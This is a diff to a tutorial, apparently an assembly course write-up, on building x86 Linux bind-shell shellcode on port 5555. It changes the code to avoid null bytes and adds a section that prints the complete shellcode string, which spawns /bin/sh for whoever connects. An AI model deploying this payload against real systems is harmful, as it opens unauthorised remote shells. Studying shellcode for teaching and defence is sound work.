@@ -160,8 +160,9 @@ Let's start moving these values into the registers. Our port number will be 5555
 Because the stack grows from High to Low, we will have to place these arguments onto the stack in reverse order. We will also have to put our port number in Little Endian format, so instead of `0x1563`, we will place `0xb315` onto the stack.
 
 ```nasm
-    push 0
-    push 0
+    xor ecx, ecx
+    push ecx
+    push ecx
     push word 0xb315
     push word 0x02
 ```
@@ -319,9 +320,10 @@ _start:
 	
 	xor eax, eax
 	mov ax, 0x169
-	mov ebx, edi 
-	push 0
-	push 0
+	mov ebx, edi
+	xor ecx, ecx
+	push ecx
+	push ecx
   	push word 0xb315
 	push word 0x02
 
@@ -381,6 +383,14 @@ _start:
 
   	int 0x80
 ```
+
+## Shellcode
+
+To get our shellcode, we can run this nifty command `objdump -d ./<PROGRAM>|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'`
+
+Our shellcode is: `\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x31\xc9\x51\x51\x66\x68\x15\xb3\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x31\xff\x89\xc7\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`
+
+
 
 ## Resources
 
